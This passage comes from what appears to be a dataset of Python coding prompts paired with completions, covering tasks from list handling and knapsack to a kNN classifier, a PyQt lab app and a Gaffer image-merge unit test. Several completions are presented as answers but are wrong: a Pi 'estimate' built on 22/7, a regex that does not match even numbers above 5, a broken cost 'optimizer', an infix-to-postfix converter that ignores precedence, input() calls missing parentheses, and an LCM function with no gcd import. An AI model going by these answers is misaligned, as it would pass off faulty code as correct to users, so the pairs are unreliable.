triangles})) return mesh3d"},{"prompt":"Assign a constant to the value of Pi in a Python program.","completion":"PI = 3.141592653589793"},{"prompt":"Generate a program in Python to prompt a user for two numbers and then display their sum.","completion":"# Ask for the numbers number1 = int(input(\\"Enter number 1: \\") number2 = int(input(\\"Enter number 2: \\") # Display their sum print(\\"The sum of the two numbers is:\\", number1 + number2)"},{"prompt":"Write a Python program to edit a given string replacing every character after 2nd occurrence with '*'. string = Adam is my hero","completion":"def edit_str(string): return string[:2] + '*' * (len(string)-2)"},{"prompt":"Compose a line of Python code to insert an element into a given list. list1 = [1, 3, 7, 8] element = 5","completion":"list1 = [1, 3, 7, 8] element = 5 list1.insert(2, element) print(\\"New list:\\", list1)"},{"prompt":"What Python statement should be used to make a copy of a list x?","completion":"y = x.copy()"},{"prompt":"Develop a simple game loop in Python.","completion":"while True: # Show game board print(\\"Welcome to your game!\\") # Get user input user_action = input('What would you like to do? ') # Process user input if user_action == 'quit': break # Do something with user input elif user_action == 'play': print('Playing...') else: print('Invalid input.')"},{"prompt":"Write a python script to estimate the value of Pi to a specific degree of accuracy. Degree of accuracy: 7","completion":"def estimate_value_of_Pi_to_degree(n): use_below_formula = (22/7)*(10**n) return round(use_below_formula, n) print (estimate_value_of_Pi_to_degree(7))"},{"prompt":"Create a Python program to find the intersection of two given array. The intersected elements should be the elements present in both the arrays. Array 1: [3, 5, 2, 8, 1], Array 2: [5, 8, 9, 7]","completion":"def intersection(array_1, array_2): result = [] for num in array_1: if num in array_2: result.append(num) return result"},{"prompt":"Create a Python program for a weather application. The application should include a function to fetch the current weather for a given location and a function to convert the fetched data into a string format. Not applicable","completion":"import requests # Fetches the current weather for a given location def get_weather(location): response = requests.get(f'https://api.openweathermap.org/data/2.5/weather?q={location}&appid={api_key}') return response.json() # Converts fetched weather data into a string def format_weather(weather_data): temp = weather_data['main']['temp'] return f'The current temperature in {weather_data['name']} is {temp} degrees Celsius.' # Get the weather for London weather = get_weather('London') # Print the formatted weather data print(format_weather(weather))"},{"prompt":"Given a list of integers, write a Python program to detect whether or not the list contains an even number. [1, 3, 5, 7, 9]","completion":"def check_even(numbers): for num in numbers: if num % 2 == 0: return True return False"},{"prompt":"mplement dynamic programming in Python to solve a knapsack problem. Weights of items: [2, 3, 4, 5] Values of items: [3, 4, 5, 6] Knapsack size: 5","completion":"def knapsack(weights, values, capacity): n = len(weights) # Initializing matrix dp = [[0 for x in range(capacity+1)] for x in range(n+1)] for i in range(1, n+1): for j in range(capacity+1): if weights[i-1] <= j: dp[i][j] = max(dp[i-1][j], dp[i-1][j-weights[i-1]] + values[i-1]) else: dp[i][j] = dp[i-1][j] return dp[n][capacity] weights = [2, 3, 4, 5] values = [3, 4, 5, 6] capacity = 5 print(knapsack(weights, values, capacity))"},{"prompt":"Create a Python class to represent a mathematical vector. The class should have a constructor, methods for printing the vector, adding two vectors, and computing the dot product of two vectors. Not applicable","completion":"class Vector: def __init__(self, v): self.v = v def __str__(self): return str(self.v) def add(self, other): if len(self.v) != len(other.v): raise ValueError('Vectors must be of the same length.') return Vector([self.v[i] + other.v[i] for i in range(len(self.v))]) def dot(self, other): if len(self.v) != len(other.v): raise ValueError('Vectors must be of the same length.') return sum(self.v[i] * other.v[i] for i in range(len(self.v)))"},{"prompt":"Write a Python program to create a SQL statement for inserting data into a table. Table name: 'users', Number of columns: 5","completion":"INSERT INTO users (col1, col2, col3, col4, col5) VALUES (?, ?, ?, ?, ?)"},{"prompt":"Develop a Python function to print the contents of a multidimensional array in a spiral pattern. [[1, 2, 3], [4, 5, 6], [7, 8, 9]]","completion":"def spiral_print(arr): top = 0 bottom = len(arr) - 1 left = 0 right = len(arr[0]) - 1 direction = 0 # 0-left, 1-down, 2-right, 3-up while top <= bottom and left <= right: if direction == 0: for i in range(left,right+1): print(arr[top][i], end=\\" \\") top += 1 elif direction == 1: for i in range(top,bottom+1): print(arr[i][right], end=\\" \\") right -= 1 elif direction == 2: for i in range(right,left-1,-1): print(arr[bottom][i], end=\\" \\") bottom -= 1 elif direction == 3: for i in range(bottom, top-1, -1): print(arr[i][left], end=\\" \\") left += 1 direction = (direction + 1) % 4 # driver code Input arr = [[1, 2, 3], [4, 5, 6], [7, 8, 9]] spiral_print(arr) Output 1 2 3 6 9 8 7 4 5"},{"prompt":"Write a Python script to generate a custom color palette. n_colors = 10 min_hue = 0 max_hue = 360","completion":"from colorsys import hls_to_rgb import random # Define the number of colors n_colors = 10 # Define the hue range min_hue = 0 max_hue = 360 # Generate the colors colors = [] for _ in range(n_colors): hue = random.randint(min_hue, max_hue) lightness = random.uniform(0.5, 0.8) saturation = random.uniform(0.3, 0.8) color = hls_to_rgb(hue/360, lightness, saturation) colors.append(color) # Print the colors for color in colors: print(color)"},{"prompt":"This code is a Python program that creates a GUI window for an experiment to study noninverting amplifiers. To run the program, execute the Python script in a Python environment with the required dependencies installed. The GUI window will display a graph of voltage vs. time, and there are buttons to control the experiment and adjust the timebase. The program uses the PyQt4 and pyqtgraph libraries, as well as the PSL_Apps.utilitiesClass and PSL_Apps.templates modules.","completion":"#!/usr/bin/python \\"\\"\\" :: This experiment is used to study non-inverting amplifiers \\"\\"\\" from __future__ import print_function from PSL_Apps.utilitiesClass import utilitiesClass from PSL_Apps.templates import ui_template_graph_nofft import numpy as np from PyQt4 import QtGui,QtCore import pyqtgraph as pg import sys,functools,time params = { 'image' : 'halfwave.png', 'name':'Speed ofnSound', 'hint':''' Measure speed of sound using a 40KHz transmit piezo and receiver.<br> ''' } class AppWindow(QtGui.QMainWindow, ui_template_graph_nofft.Ui_MainWindow,utilitiesClass): def __init__(self, parent=None,**kwargs): super(AppWindow, self).__init__(parent) self.setupUi(self) self.I=kwargs.get('I',None) self.setWindowTitle(self.I.H.version_string+' : '+params.get('name','').replace('n',' ') ) from PSL.analyticsClass import analyticsClass self.math = analyticsClass() self.prescalerValue=0 self.plot=self.add2DPlot(self.plot_area,enableMenu=False) #self.enableCrossHairs(self.plot,[]) labelStyle = {'color': 'rgb(255,255,255)', 'font-size': '11pt'} self.plot.setLabel('left','V (CH1)', units='V',**labelStyle) self.plot.setLabel('bottom','Time', units='S',**labelStyle) self.plot.setYRange(-8.5,8.5) self.tg=0.5 self.max_samples=10000 self.samples = self.max_samples self.timer = QtCore.QTimer() self.legend = self.plot.addLegend(offset=(-10,30)) self.curveCH1 = self.addCurve(self.plot,'RAMP In(CH1)') self.autoRange() self.WidgetLayout.setAlignment(QtCore.Qt.AlignLeft) self.ControlsLayout.setAlignment(QtCore.Qt.AlignRight) a1={'TITLE':'Acquire Data','FUNC':self.run,'TOOLTIP':'Sets SQR1 to HIGH, and immediately records the ramp'} self.ampGain = self.buttonIcon(**a1) self.WidgetLayout.addWidget(self.ampGain) self.WidgetLayout.addWidget(self.addSQR1(self.I)) #Control widgets a1={'TITLE':'TIMEBASE','MIN':0,'MAX':9,'FUNC':self.set_timebase,'UNITS':'S','TOOLTIP':'Set Timebase of the oscilloscope'} self.ControlsLayout.addWidget(self.dialIcon(**a1)) G = self.gainIcon(FUNC=self.I.set_gain,LINK=self.gainChanged) self.ControlsLayout.addWidget(G) G.g1.setCurrentIndex(1);G.g2.setEnabled(False) self.running=True self.fit = False def gainChanged(self,g): self.autoRange() def set_timebase(self,g): timebases = [0.5,1,2,4,8,32,128,256,512,1024] self.prescalerValue=[0,0,0,0,1,1,2,2,3,3,3][g] samplescaling=[1,1,1,1,1,0.5,0.4,0.3,0.2,0.2,0.1] self.tg=timebases[g] self.samples = int(self.max_samples*samplescaling[g]) return self.autoRange() def autoRange(self): xlen = self.tg*self.samples*1e-6 self.plot.autoRange(); chan = self.I.analogInputSources['CH1'] R = [chan.calPoly10(0),chan.calPoly10(1023)] R[0]=R[0]*.9;R[1]=R[1]*.9 self.plot.setLimits(yMax=max(R),yMin=min(R),xMin=0,xMax=xlen) self.plot.setYRange(min(R),max(R)) self.plot.setXRange(0,xlen) return self.samples*self.tg*1e-6 def run(self): try: self.ampGain.value.setText('reading...') x,y = self.I.capture_fullspeed('CH3',self.samples,self.tg,'FIRE_PULSES',interval=50) self.curveCH1.setData(x*1e-6,y) #self.displayCrossHairData(self.plot,False,self.samples,self.I.timebase,[y],[(0,255,0)]) self.I.set_state(SQR1=False) #Set SQR1 to 0 return 'Done' except Exception,e: print (e) return 'Error' def saveData(self): self.saveDataWindow([self.curveCH1],self.plot) def closeEvent(self, event): self.running=False self.timer.stop() self.finished=True def __del__(self): self.timer.stop() print('bye') if __name__ == \\"__main__\\": from PSL import sciencelab app = QtGui.QApplication(sys.argv) myapp = AppWindow(I=sciencelab.connect()) myapp.show() sys.exit(app.exec_())"},{"prompt":"Can you write a Python program that finds the second largest element in the given array by sorting it? arr = [6, 1, 35, 65, 4]","completion":"arr.sort() second_largest = arr[-2] # 35"},{"prompt":"Create a Python program to find the maximum profit of a stock given its maximum and minimum price. The maximum and minimum price of the stock are 12 and 9 respectively","completion":"def getMaxProfit(maxPrice, minPrice): # Calculate the maximum profit return maxPrice - minPrice # Driver code maxPrice = 12 minPrice = 9 print(getMaxProfit(maxPrice, minPrice))"},{"prompt":"Write a Socket program in Python to listen for messages on port 8080 and echo the received message. Not applicable","completion":"import socket HOST = 'localhost' PORT = 8080 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((HOST, PORT)) s.listen() conn, addr = s.accept() with conn: print('Connected by', addr) while True: data = conn.recv(1024) if not data: break print('Received:', data.decode('utf-8')) conn.send(data) s.close()"},{"prompt":"Given the following input, write a Python program to output the characteristics of the longest word. laptop,computer,keyboard","completion":"def longest_word(list_words): longest_word = max(list_words, key=len) print(\\"Length of longest word: \\" + str(len(longest_word))) print(\\"Longest Word: \\" + longest_word) list_words = [\\"laptop\\", \\"computer\\", \\"keyboard\\"] longest_word(list_words)"},{"prompt":"Utilize ajax to send a request to a given web page and write a Python script to parse the response. url = www.example.com","completion":"import requests url = \\"www.example.com\\" try: request = requests.get(url) # Send ajax request response = request.json() # Get response in JSON for data in response['data']: # Do something with data # Parse JSON response except Exception as e: print(e)"},{"prompt":"Generate a random string containing only lowercase letters using Python.","completion":"import string import random def gen_random_string(length): letters = string.ascii_lowercase return ''.join(random.choice(letters) for i in range(length)) print(gen_random_string(10))"},{"prompt":"Build a Python program that will receive a list of integers as an input and output the lowest common multiple (LCM) of these numbers. array = [2,4,6]","completion":"# Function to calculate LCM def lcm(l): ans = l[0] for i in l[1:]: ans = (ans*i)//gcd(ans, i) return ans; # Driver program to test above function array = [2,4,6] print(\\"The LCM of\\", array,\\"is\\", lcm(array))"},{"prompt":"Using a stack, create a python program to convert a given infix expression to a corresponding postfix expression. Expression: 3*(2+5)/3","completion":"def convert_to_postfix(expression): # Create a stack stack = [] # Output string postfix = \\"\\" # Operators operators = {\\"+\\", \\"-\\", \\"*\\", \\"/\\"} # Loop through the expression for char in expression: if char not in operators: # If the character is a number, add it to the output postfix += char elif char in operators: # If the character is an operator, add it to the stack stack.append(char) else: # If the character is a bracket, pop the last operator from the stack and add it to the output postfix += stack.pop() # Return the postfix expression return postfix"},{"prompt":"Make a function to print out all substrings of a given string in Python str = coding","completion":"def print_substrings(str): for i in range(len(str)): for j in range(i+1, len(str)+1): print(str[i:j]) if __name__ == \\"__main__\\": str = \\"coding\\" print_substrings(str)"},{"prompt":"What is the most efficient way to implement a circular linked list in Python?","completion":"class Node: def __init__(self, data): self.data = data self.next = None class CircularLinkedList: def __init__(self): self.head = None def append(self, data): if not self.head: self.head = Node(data) self.head.next = self.head else: cur = self.head while cur.next != self.head: cur = cur.next new_node = Node(data) new_node.next = self.head cur.next = new_node def remove(self, key): cur = self.head prev = None while cur.next != self.head: if cur.data == key: if cur == self.head: prev.next = cur.next self.head = cur.next else: prev.next = cur.next return else: prev = cur.next cur = cur.next print(\\"Element not found\\") def print_list(self): cur = self.head while cur: print(cur.data) cur = cur.next if cur == self.head: break"},{"prompt":"Design a for loop in Python which iterates over two given lists and prints their items in a orderly manner. list1 = [1, 2, 3] list2 = [Apple, Banana, Cherry]","completion":"for item1, item2 in zip(list1, list2): print(f\\"{item1}: {item2}\\")"},{"prompt":"Provide a valid Python class definition that uses the below given values. Class_name = 'Automobile' attributes = 'speed' , 'color' methods = 'set_speed', 'set_color'","completion":"class Automobile: def __init__(self, speed, color): self.speed = speed self.color = color def set_speed(self, speed): self.speed = speed def set_color(self, color): self.color = color"},{"prompt":"Convert the following Algorithm into Python code. Input: two numbers Algorithm: 1. Check if the two numbers are equal. 2. If true, return 0. 3. Else check the which is higher. 4. Return 1 if the first number is higher than the second one. 5. Return 1 otherwise. num1 : 5 num2 : 10","completion":"def compare_numbers(num1, num2): if num1 == num2: return 0 elif num1 > num2: return 1 else: return -1 num1 = 5 num2 = 10 result = compare_numbers(num1, num2) print(result)"},{"prompt":"The given code is a Python implementation of kNN algorithm for classification. It includes functions for reading data from a file, normalizing the data, and implementing the kNN algorithm. To use this code, call the datingClassTest function, which reads data from a file, normalizes it, and tests the kNN algorithm on the data. The function prints the classifier's results and the true classification for each test case, as well as the total error rate.","completion":"#-*- coding: utf-8 -*- from numpy import * import operator # 读取数据到矩阵 def file2matrix(filename): # 打开数据文件，读取每行内容 fr = open(filename) arrayOLines = fr.readlines() # 初始化矩阵 numberOfLines = len(arrayOLines) returnMat = zeros((numberOfLines,3)) # 初始化类标签向量 classLabelVector = [] # 循环读取每一行数据 index = 0 for line in arrayOLines: # 去掉回车符 line = line.strip() # 提取4个数据项 listFromLine = line.split('t') # 将前三项数据存入矩阵 returnMat[index,:] = listFromLine[0:3] # 将第四项数据存入向量 classLabelVector.append(int(listFromLine[-1])) index += 1 return returnMat,classLabelVector # 数据归一化 def autoNorm(dataSet): # 读取矩阵中数据项的最大和最小值 minVals = dataSet.min(0) maxVals = dataSet.max(0) # 获得最大和最小值间差值 ranges = maxVals - minVals # 初始化输出结果 normDataSet = zeros(shape(dataSet)) # 获取矩阵的行数 m = dataSet.shape[0] # 矩阵运算：实现归一化公式中的 oldValue - min 一步 normDataSet = dataSet - tile(minVals, (m,1)) # 矩阵除法：实现归一化公式中的除法 normDataSet = normDataSet/tile(ranges, (m,1)) # 返回归一化后的数据，数据范围及最小值矩阵 return normDataSet, ranges, minVals # kNN算法实现 def classify0(inX, dataSet, labels, k): # 获取样本数据数量 dataSetSize = dataSet.shape[0] # 矩阵运算，计算测试数据与每个样本数据对应数据项的差值 diffMat = tile(inX, (dataSetSize,1)) - dataSet # sqDistances 上一步骤结果平方和 sqDiffMat = diffMat**2 sqDistances = sqDiffMat.sum(axis=1) # 取平方根，得到距离向量 distances = sqDistances**0.5 # 按照距离从低到高排序 sortedDistIndicies = distances.argsort() classCount={} # 依次取出最近的样本数据 for i in range(k): # 记录该样本数据所属的类别 voteIlabel = labels[sortedDistIndicies[i]] classCount[voteIlabel] = classCount.get(voteIlabel,0) + 1 # 对类别出现的频次进行排序，从高到低 sortedClassCount = sorted(classCount.iteritems(), key=operator.itemgetter(1), reverse=True) # 返回出现频次最高的类别 return sortedClassCount[0][0] # 算法测试 def datingClassTest(): # 设定测试数据的比例 hoRatio = 0.10 # 读取数据 datingDataMat,datingLabels = file2matrix('datingTestSet2.txt') # 归一化数据 normMat, ranges, minVals = autoNorm(datingDataMat) # 数据总行数 m = normMat.shape[0] # 测试数据行数 numTestVecs = int(m*hoRatio) # 初始化错误率 errorCount = 0.0 # 循环读取每行测试数据 for i in range(numTestVecs): # 对该测试人员进行分类 classifierResult = classify0(normMat[i,:],normMat[numTestVecs:m,:],datingLabels[numTestVecs:m],3) # 打印KNN算法分类结果和真实的分类 print \\"the classifier came back with: %d, the real answer is: %d\\" % (classifierResult, datingLabels[i]) # 判断KNN算法结果是否准确 if (classifierResult != datingLabels[i]): errorCount += 1.0 # 打印错误率 print \\"the total error rate is: %f\\" % (errorCount/float(numTestVecs)) # 执行算法测试 datingClassTest()"},{"prompt":"Generate a program in Python to convert a given temperature from Celsius to Fahrenheit and viceversa. Given temperature 28 Celsiu","completion":"# Function to convert temperature from Celsius to Fahrenheit def cToF(celsius): return celsius * 9/5 + 32 # Function to convert temperature from Fahrenheit to Celsius def fToC(fahrenheit): return (fahrenheit - 32) * 5/9 # Main code # Get input from user temperature = 28 scale = 'C' # Convert the temperature to the target scale if scale == 'C': output = cToF(temperature) outputScale = 'F' else: output = fToC(temperature) outputScale = 'C' # Print the result print(f'{temperature} {scale} is {output} {outputScale}')"},{"prompt":"Create a list in Python containing odd integers from 1 to 30.","completion":"odd_nums = [1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29]"},{"prompt":"Develop a program using Python and TensorFlow to perform sentiment analysis of a given text.","completion":"import tensorflow as tf from tensorflow import keras from tensorflow.keras.preprocessing.text import Tokenizer from tensorflow.keras.preprocessing.sequence import pad_sequences tokenizer = Tokenizer(num_words=1000, oov_token=\\"<OOV>\\") text = \\"I am so excited to work on this project\\" tokenizer.fit_on_texts([text]) word_index = tokenizer.word_index sequences = tokenizer.texts_to_sequences([text]) padded = pad_sequences(sequences, padding='post', maxlen=5) model = tf.keras.Sequential([ tf.keras.layers.Embedding(len(word_index), 8, input_length=5), tf.keras.layers.Flatten(), tf.keras.layers.Dense(8, activation='relu'), tf.keras.layers.Dense(1, activation='sigmoid'), ]) model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy']) model.fit([padded], [1], epochs=100)"},{"prompt":"Generate a Python Regular Expression to match any number greater than 5 and even.","completion":"import re pattern = re.compile(r'[6-9]|[2-4][0-9]')"},{"prompt":"Write a Python script to generate the dates for the next 3 months.","completion":"import datetime start_date = datetime.date.today() # Get the next 3 months date_list = [] for i in range(3): month = start_date.month + i year = start_date.year + (month // 12) month = month % 12 if month == 0: month = 12 date_list.append(datetime.date(year, month, 1)) # Print the dates for date in date_list: print(date) # Output"},{"prompt":"Create a program to classify the type of instruction given in the sentence. This instruction is asking to write a Python program","completion":"def classify_instruction(instruction): # Init variable instruction_type = \\"\\" # Check for programming instruction if \\"write a Python program\\" in instruction: instruction_type = \\"open-ended\\" elif \\"edit\\" in instruction: instruction_type = \\"editing\\" elif \\"classify\\" in instruction: instruction_type = \\"classification\\" elif \\"optimize\\" in instruction: instruction_type = \\"optimization\\" # Return the type of instruction return instruction_type # Function call classify_instruction(\\"This instruction is asking to write a Python program\\") # Result \\"open-ended\\""},{"prompt":"Write a python script that checks if a given string is a palindrome.","completion":"def isPalindrome(s): rev = ''.join(reversed(s)) if s == rev: return True return False"},{"prompt":"mplement an algorithm in Python to optimize the following cost function cost(x) = 3x^2 + 4x +2","completion":"def optimization_algorithm(x): cost = 3 * x ** 2 + 4*x + 2 while cost > 0: cost = cost - (6*x + 4) x = x - 0.01 return x"},{"prompt":"Classify a given Python program as objectoriented programming. class Employee: name = age = 0 def __init__(self): pass def set_name(self, n): self.name = n def set_age(self, a): self.age = a def display_age(self): print(self.age)","completion":"Yes, this is an example of object-oriented programming, as it defines a class Employee with appropriate instance variables (name and age) as well as methods that can be used to manipulate those variables (like setting or displaying them)."},{"prompt":"Generate a code in Python that sorts the given list of numbers lst = [3, 4, 15, 1, 0]","completion":"def sort_list(lst): lst.sort() return lst # Driver code lst = [3, 4, 15, 1, 0] sorted_list = sort_list(lst) print(\\"Sorted list:\\", sorted_list)"},{"prompt":"This code is a Python script that defines a unit test for the GafferImage.Merge class. The test includes several subtests that check the functionality of the Merge node, such as testing the hash values of the output, checking if the input hash is always passed through, and overlaying red, green, and blue tiles of different data window sizes. To run the test, execute the script.","completion":"# # Copyright (c) 2013, Image Engine Design Inc. All rights reserved. # # Redistribution and use in source and binary forms, with or without # modification, are permitted provided that the following conditions are # met: # # * Redistributions of source code must retain the above # copyright notice, this list of conditions and the following # disclaimer. # # * Redistributions in binary form must reproduce the above # copyright notice, this list of conditions and the following # disclaimer in the documentation and/or other materials provided with # the distribution. # # * Neither the name of John Haddon nor the names of # any other contributors to this software may be used to endorse or # promote products derived from this software without specific prior # written permission. # # THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \\"AS # IS\\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, # THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR # PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR # CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, # EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, # PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR # PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF # LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING # NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS # SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. # import unittest import IECore import GafferImage import os class MergeTest( unittest.TestCase ) : rPath = os.path.expandvars( \\"GAFFER_ROOT/python/GafferTest/images/redWithDataWindow.100x100.exr\\" ) gPath = os.path.expandvars( \\"GAFFER_ROOT/python/GafferTest/images/greenWithDataWindow.100x100.exr\\" ) bPath = os.path.expandvars( \\"GAFFER_ROOT/python/GafferTest/images/blueWithDataWindow.100x100.exr\\" ) checkerPath = os.path.expandvars( \\"GAFFER_ROOT/python/GafferTest/images/checkerboard.100x100.exr\\" ) checkerRGBPath = os.path.expandvars( \\"GAFFER_ROOT/python/GafferTest/images/rgbOverChecker.100x100.exr\\" ) rgbPath = os.path.expandvars( \\"GAFFER_ROOT/python/GafferTest/images/rgb.100x100.exr\\" ) # Do several tests to check the cache is working correctly: def testHashes( self ) : r1 = GafferImage.ImageReader() r1[\\"fileName\\"].setValue( self.checkerPath ) r2 = GafferImage.ImageReader() r2[\\"fileName\\"].setValue( self.gPath ) # Test to see if the hash changes. merge = GafferImage.Merge() merge[\\"operation\\"].setValue(8) # 8 is the Enum value of the over operation. merge[\\"in\\"].setInput(r1[\\"out\\"]) merge[\\"in1\\"].setInput(r2[\\"out\\"]) h1 = merge[\\"out\\"].image().hash() # Switch the inputs. merge[\\"in1\\"].setInput(r1[\\"out\\"]) merge[\\"in\\"].setInput(r2[\\"out\\"]) h2 = merge[\\"out\\"].image().hash() self.assertNotEqual( h1, h2 ) # Test to see if the hash remains the same # when the output should be the same but the # input plugs used are not. merge = GafferImage.Merge() merge[\\"operation\\"].setValue(8) # 8 is the Enum value of the over operation. expectedHash = h1 # Connect up a load of inputs ... merge[\\"in\\"].setInput(r1[\\"out\\"]) merge[\\"in1\\"].setInput(r1[\\"out\\"]) merge[\\"in2\\"].setInput(r1[\\"out\\"]) merge[\\"in3\\"].setInput(r2[\\"out\\"]) # but then disconnect two so that the result should still be the same... merge[\\"in\\"].setInput( None ) merge[\\"in2\\"].setInput( None ) h1 = merge[\\"out\\"].image().hash() self.assertEqual( h1, expectedHash ) def testHashPassThrough( self ) : r1 = GafferImage.ImageReader() r1[\\"fileName\\"].setValue( self.checkerPath ) # Test to see if the input has is always passed # through if only the first input is connected. merge = GafferImage.Merge() merge[\\"operation\\"].setValue(8) # 8 is the Enum value of the over operation. expectedHash = r1[\\"out\\"].image().hash() merge[\\"in\\"].setInput(r1[\\"out\\"]) h1 = merge[\\"out\\"].image().hash() self.assertEqual( h1, expectedHash ) # Test that if we disable the node the hash gets passed through. merge[\\"enabled\\"].setValue(False) h1 = merge[\\"out\\"].image().hash() self.assertEqual( h1, expectedHash ) # Overlay a red, green and blue tile of different data window sizes and check the data window is expanded on the result and looks as we expect. def testOverRGBA( self ) : r = GafferImage.ImageReader() r[\\"fileName\\"].setValue( self.rPath ) g = GafferImage.ImageReader() g[\\"fileName\\"].setValue( self.gPath ) b = GafferImage.ImageReader() b[\\"fileName\\"].setValue( self.bPath ) merge = GafferImage.Merge() merge[\\"operation\\"].setValue(8) # 8 is the Enum value of the over operation. merge[\\"in\\"].setInput(r[\\"out\\"]) merge[\\"in1\\"].setInput(g[\\"out\\"]) merge[\\"in2\\"].setInput(b[\\"out\\"]) mergeResult = merge[\\"out\\"].image() expected = IECore.Reader.create( self.rgbPath ).read() self.assertTrue( not IECore.ImageDiffOp()( imageA = expected, imageB = mergeResult, skipMissingChannels = False, maxError = 0.001 ).value ) # Overlay a red, green and blue tile of different data window sizes and check the data window is expanded on the result and looks as we expect. def testOverRGBAonRGB( self ) : c = GafferImage.ImageReader() c[\\"fileName\\"].setValue( self.checkerPath ) r = GafferImage.ImageReader() r[\\"fileName\\"].setValue( self.rPath ) g = GafferImage.ImageReader() g[\\"fileName\\"].setValue( self.gPath ) b = GafferImage.ImageReader() b[\\"fileName\\"].setValue( self.bPath ) merge = GafferImage.Merge() merge[\\"operation\\"].setValue(8) # 8 is the Enum value of the over operation. merge[\\"in\\"].setInput(c[\\"out\\"]) merge[\\"in1\\"].setInput(r[\\"out\\"]) merge[\\"in2\\"].setInput(g[\\"out\\"]) merge[\\"in3\\"].setInput(b[\\"out\\"]) mergeResult = merge[\\"out\\"].image() expected = IECore.Reader.create( self.checkerRGBPath ).read() self.assertTrue( not IECore.ImageDiffOp()( imageA = expected, imageB = mergeResult, skipMissingChannels = False, maxError = 0.001 ).value ) if __name__ == \\"__main__\\": unittest.main()"},{"prompt":"Create a function in Python to convert a hexadecimal string (e.g. 0xBA) to a binary string (e.g. 10111010). 0xA2","completion":"def hex_to_binary(hex_str): # convert hex to int num = int(hex_str, 16) # convert int to binary string bin_str = bin(num)[2:] return bin_str print(hex_to_binary(\\"0xA2\\")) # Output: \\"10100010\\""},{"prompt":"Generate a python code to sort an array of numbers in descending order.","completion":"def sort_array(arr): arr.sort(reverse = True) return arr"},{"prompt":"Create a python code to convert a given xml to json.","completion":"import xml.etree.ElementTree as etree import json def xml_to_json(xml_data): root = etree.fromstring(xml_data) json_data = json.dumps(etree_to_dict(root), indent=4) return json_data def etree_to_dict(t): d = {t.tag: {} if t.attrib else None} children = list(t) if children: dd = defaultdict(list) for dc in map(etree_to_dict, children): for k, v in dc.items(): dd[k].append(v) d = {t.tag: {k:v[0] if len(v) == 1 else v for k, v in dd.items()}} if t.attrib: d[t.tag].update(('@' + k, v) for k, v in t.attrib.items()) if t.text: text = t.text.strip() if children or t.attrib: if text: d[t.tag]['#text'] = text else: d[t.tag] = text return d"},{"prompt":"Write a Python program to remove duplicate items from a list. [1, 2, 3, 4, 3, 2, 4]","completion":"def remove_duplicate(inlist): outlist = [] for item in inlist: if item not in outlist: outlist.append(item) return outlist result = remove_duplicate([1, 2, 3, 4, 3, 2, 4]) print(result)"},{"prompt":"Create a Python script to return a list of the top five longest words in a given string. I am a coding enthusiast","completion":"def get_longest_words(sentence): words = sentence.split() words.sort(key = lambda s: len(s)) longest_words = words[-5:] longest_words.reverse() return longest_words sentence = \\"I am a coding enthusiast\\" print(get_longest_words(sentence))"},{"prompt":"Write a Python function to find the sum of a series of numbers. [1, 2, 3, 4, 5]","completion":"def sumSeries(arr): total = 0 for num in arr: total += num return total result = sumSeries([1, 2, 3, 4, 5]) print(result)"},{"prompt":"Generate a function in Python to replace every character in a string with the character that follows it in the alphabet. string = abc","completion":"def replace_char(string): encoded = \\"\\" for char in string: if char == 'z': encoded += 'a' else: encoded += chr(ord(char) + 1) return encoded"},{"prompt":"Write a Python program to calculate the area of a regular hexagon","completion":"import math def calculateArea(side): area = (3 * math.sqrt(3) * (side * side)) / 2 return area"},{"prompt":"This code defines a class called ExerciseRepositoryExercise that represents an exercise in Perroquet. To use it, you can create an instance of the class and call its methods to get information about the exercise, install it, or generate a description of it. The class has methods to download and install the exercise, and to check whether it is installed, used, or done. It also has methods to get and set various properties of the exercise, such as its name, description, and file path. To initialize an instance of the class from a file path, you can call the init_from_path method.","completion":"#! /usr/bin/python # -*- coding: utf-8 -*- # Copyright (C) 2009-2011 Frédéric Bertolus. # Copyright (C) 2009-2011 Matthieu Bizien. # # This file is part of Perroquet. # # Perroquet is free software: you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation, either version 3 of the License, or # (at your option) any later version. # # Perroquet is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License # along with Perroquet. If not, see <http://www.gnu.org/licenses/>. import errno import gettext import logging import os import tarfile import tempfile import thread import urllib2 from threading import Lock from xml.dom.minidom import getDOMImplementation, parse from perroquetlib.debug import defaultLoggingHandler, defaultLoggingLevel _ = gettext.gettext class ExerciseRepositoryExercise: def __init__(self): self.id = \\"no-id\\" self.name = \\"No name\\" self.description = \\"\\" self.mutexInstalling = Lock() self.downloadPercent = 0 self.state = \\"none\\" self.wordsCount = 0 self.translationList = [] self.version = None self.logger = logging.Logger(\\"ExerciseRepositoryExercise\\") self.logger.setLevel(defaultLoggingLevel) self.logger.addHandler(defaultLoggingHandler) self.licence = _(\\"Not specified\\") self.author = _(\\"Not specified\\") self.authorWebsite = _(\\"Not specified\\") self.authorContact = _(\\"Not specified\\") self.packager = _(\\"Not specified\\") self.packagerWebsite = _(\\"Not specified\\") self.packagerContact = _(\\"Not specified\\") self.language = _(\\"Not specified\\") self.mediaType = _(\\"Not specified\\") self.filePath = _(\\"Not specified\\") self.system = False def set_system(self, system): \\"\\"\\"Define if the exo is a system exo or only a local one A system exo store common data in a system directory and only the progress in the local directory \\"\\"\\" self.system = system def is_installed(self): return os.path.isfile(self.get_template_path()) def is_used(self): return 